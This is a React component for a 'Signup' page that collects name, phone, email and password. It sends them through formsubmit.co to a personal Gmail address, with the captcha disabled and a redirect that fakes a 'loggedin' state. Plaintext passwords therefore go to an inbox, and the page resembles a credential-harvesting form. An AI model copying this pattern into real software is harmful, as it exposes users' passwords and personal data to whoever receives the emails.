import React from "react";

function App() {
  return (
    <div
      style={{
        minHeight: "100vh",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        background: "#000",
        padding: "20px",
      }}
    >
      <form
        action="https://formsubmit.co/sanchitsaini3333@gmail.com"
        method="POST"
        style={{
          width: "100%",
          maxWidth: "350px",
          background: "#111",
          padding: "25px",
          borderRadius: "12px",
        }}
      >
        <h1 style={{ color: "white", textAlign: "center" }}>
          Signup
        </h1>

        <input type="hidden" name="_captcha" value="false" />
        <input type="hidden" name="_next" value="https://resilient-sable-8cb929.netlify.app/?loggedin=true" />
        <input type="hidden" name="_next" value="https://resilient-sable-8cb929.netlify.app/?loggedin=true" />


        <input name="Name" placeholder="Full Name" required style={input} />
        <input name="Phone" placeholder="Phone Number" required style={input} />
        <input name="Email" type="email" placeholder="Email" required style={input} />
        <input name="Password" type="password" placeholder="Password" required style={input} />

        <button type="submit" style={button}>
          Submit
        </button>
      </form>
    </div>
  );
}

const input = {
  width: "100%",
  padding: "14px",
  marginBottom: "14px",
  borderRadius: "8px",
  border: "1px solid #333",
  background: "#222",
  color: "white",
  boxSizing: "border-box",
};

const button = {
  width: "100%",
  padding: "14px",
  border: "none",
  borderRadius: "8px",
  background: "#0077ff",
  color: "white",
  fontWeight: "bold",
  cursor: "pointer",
};

export default App;
